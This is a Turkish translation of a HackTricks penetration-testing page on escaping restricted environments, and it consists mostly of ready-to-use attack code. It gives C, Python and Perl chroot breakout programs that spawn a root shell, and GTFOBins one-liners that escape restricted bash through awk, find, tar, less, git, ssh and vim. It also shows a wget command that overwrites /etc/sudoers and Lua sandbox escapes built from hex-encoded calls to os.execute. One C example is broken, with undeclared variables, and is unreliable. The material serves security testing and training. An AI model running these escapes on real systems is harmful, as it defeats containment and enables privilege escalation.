# Jail'lerden Kaçış

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Herhangi bir binary'yi "Shell" özelliğiyle çalıştırıp çalıştıramadığınızı** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **üzerinden arayın**

## Chroot Kaçışları

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations)'dan: chroot mekanizması, **ayrıcalıklı** (**root**) **kullanıcıların** kasıtlı olarak kurcalamasına karşı **koruma sağlamak için tasarlanmamıştır**. Çoğu sistemde chroot bağlamları düzgün şekilde iç içe geçmez ve **yeterli ayrıcalıklara sahip chroot edilmiş programlar kaçış yapmak için ikinci bir chroot gerçekleştirebilir**.\
Genellikle bu, kaçış yapmak için chroot içinde root olmanız gerektiği anlamına gelir.

> [!TIP]
> [**chw00t**](https://github.com/earthquake/chw00t) **tool'u**, aşağıdaki senaryoları abuse etmek ve `chroot`'tan kaçmak için oluşturulmuştur.<sup>[[1]](#references)</sup>

### Root + CWD

> [!WARNING]
> Bir chroot içinde **root** iseniz, **başka bir chroot oluşturarak kaçabilirsiniz**. Bunun nedeni, (Linux'ta) 2 chroot'un birlikte var olamamasıdır. Bu nedenle bir klasör oluşturup ardından **yeni bir chroot oluşturursanız** ve bunu yeni klasörde **siz onun dışında olacak şekilde** gerçekleştirirseniz, artık **yeni chroot'un dışında** olursunuz ve dolayısıyla FS içinde bulunursunuz.
>
> Bunun nedeni, chroot'un genellikle çalışma dizininizi belirtilen dizine taşımamasıdır. Böylece bir chroot oluşturabilir, ancak onun dışında olabilirsiniz.

Genellikle bir chroot jail içinde `chroot` binary'sini bulamazsınız, ancak bir binary'yi **compile edebilir, upload edebilir ve çalıştırabilirsiniz**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Bu, önceki duruma benzer, ancak bu durumda **saldırgan mevcut dizine ait bir file descriptor'ı depolar** ve ardından **chroot'u yeni bir klasörde oluşturur**. Son olarak, **chroot'un dışında** bu **FD'ye** **erişimi** olduğu için ona erişir ve **kaçar**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD, Unix Domain Sockets üzerinden geçirilebilir, bu nedenle:
>
> - Bir child process oluşturun (fork)
> - Parent ve child process'lerin iletişim kurabilmesi için UDS oluşturun
> - Child process'te farklı bir klasörde chroot çalıştırın
> - Parent proc'ta, yeni child proc chroot'unun dışında bulunan bir klasör için FD oluşturun
> - Bu FD'yi UDS kullanarak child proccess'e geçirin
> - Child process bu FD'ye chdir yapar ve FD kendi chroot'unun dışında olduğundan jail'den kaçar

### Root + Mount

> [!WARNING]
>
> - Root device'ı (/) chroot içindeki bir dizine mount etmek
> - Bu dizine chroot yapmak
>
> Bu, Linux'ta mümkündür

### Root + /proc

> [!WARNING]
>
> - Procfs'yi chroot içindeki bir dizine mount edin (henüz mount edilmemişse)
> - Farklı bir root/cwd girdisine sahip bir pid arayın, örneğin: /proc/1/root
> - Bu girdiye chroot yapın

### Root(?) + Fork

> [!WARNING]
>
> - Bir Fork (child proc) oluşturun, FS içinde daha derinde bulunan farklı bir klasöre chroot yapın ve bu klasöre CD yapın
> - Parent process'ten, child process'in bulunduğu klasörü children'ın chroot'undan önceki bir klasöre taşıyın
> - Bu children process kendisini chroot'un dışında bulacaktır

### ptrace

> [!WARNING]
>
> - Geçmişte kullanıcılar kendi process'lerini yine kendi process'lerinden debug edebiliyordu... ancak bu artık varsayılan olarak mümkün değil
> - Yine de mümkünse bir process'e ptrace uygulayabilir ve içinde bir shellcode çalıştırabilirsiniz ([bu örneğe bakın](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Jail hakkında bilgi edinin:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH'i Değiştirme

PATH env variable'ını değiştirebildiğinizi kontrol edin<sup>[[2]](#references)</sup>.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim Kullanımı
```bash
:set shell=/bin/sh
:shell
```
### Pager'lar ve help viewer'lar

Birçok kısıtlı ortam hâlâ **pager'ları** veya **help viewer'ları** kullanılabilir durumda bırakır. Bunları kötüye kullanmak genellikle `PATH`'i yeniden oluşturmaya çalışmaktan daha hızlıdır.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
`git` mevcutsa, yardım çıktısının genellikle bir pager üzerinden gösterildiğini unutmayın:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Yaygın GTFOBins tek satırlık komutları

Hangi binary'lere erişilebildiğini öğrendikten sonra önce bariz shell başlatıcılarını test edin:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Yalnızca izin verilen bir komuta **argüman enjekte edebiliyorsanız** (komutu serbestçe çalıştırmak yerine) **GTFOArgs**'i de kontrol edin.

### Script oluşturma

İçeriği _/bin/bash_ olan çalıştırılabilir bir dosya oluşturup oluşturamayacağınızı kontrol edin
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH üzerinden bash edin

ssh üzerinden erişim sağlıyorsanız, sunucudan kısıtlı giriş kabuğu yerine genellikle **farklı bir program** çalıştırmasını isteyebilirsiniz:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
`ssh` yerel olarak izin verilen birkaç binary'den biriyse, bunun **GTFOBin** olarak da kötüye kullanılabileceğini unutmayın:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Declare
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Örneğin sudoers dosyasının üzerine yazabilirsiniz
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Kısıtlı shell wrapper'ları (`git-shell`, `rssh`, `lshell`)

Bazı ortamlar sizi doğrudan düz `rbash` içine bırakmaz; bunun yerine `git-shell`, `rssh` veya `lshell` gibi **wrapper**'lar kullanır:

- `git-shell` yalnızca server-side Git komutlarını ve `~/git-shell-commands/` içinde bulunan komutları kabul eder. Bu dizin mevcutsa, izin verilen özel action'ları listelemek için `help` çalıştırın. Buraya **yazabiliyorsanız**, bu dizine bırakılan herhangi bir executable erişilebilir hale gelir.<sup>[[3]](#references)</sup>
- `rssh` / `lshell` genellikle yalnızca `scp`, `sftp`, `rsync` veya Git tarzı işlemlere izin verir. Bu durumlarda öncelikle **file write primitive**'lerine odaklanın: `authorized_keys`, bir shell startup dosyası veya bir helper script'i yazılabilir bir konuma upload edin ve ardından `ssh -t ...` ile yeniden bağlanın.
- Wrapper yalnızca command line'ı filtreliyorsa, erişilebilen binary'leri listeleyin ve ardından **GTFOBins / GTFOArgs**'e geri pivot edin.

### Diğer trick'ler

Ayrıca şunları da kontrol edin:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**Şu sayfa da ilginç olabilir:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

Python jail'lerinden escape etmeye ilişkin trick'leri aşağıdaki sayfada bulabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Bu sayfada Lua içinde erişiminiz olan global function'ları bulabilirsiniz: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Command execution ile Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Bir kütüphanenin fonksiyonlarını **nokta kullanmadan çağırmak** için bazı hileler:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Bir kütüphanenin fonksiyonlarını listeleyin:
```bash
for k,v in pairs(string) do print(k,v) end
```
Önceki tek satırlık kodu **farklı bir Lua ortamında her çalıştırdığınızda fonksiyonların sırasının değiştiğini** unutmayın. Bu nedenle belirli bir fonksiyonu çalıştırmanız gerekiyorsa farklı Lua ortamları yükleyip kütüphanedeki ilk fonksiyonu çağırarak bir brute force attack gerçekleştirebilirsiniz:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Etkileşimli lua shell edin**: Sınırlı bir lua shell içindeyseniz şu çağrıyı yaparak yeni bir lua shell (ve umarız sınırsız) elde edebilirsiniz:
```bash
debug.debug()
```
## Referanslar

- [1] [Chw00t: Çeşitli Chroot Çözümlerinden Nasıl Kaçılır (Bucsay Balazs, DeepSec konuşması ve slaytları)](https://www.youtube.com/watch?v=UO618TeyCWo)
- [2] [GNU Bash Reference Manual – Restricted Shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [3] [git-shell – Git Belgeleri](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
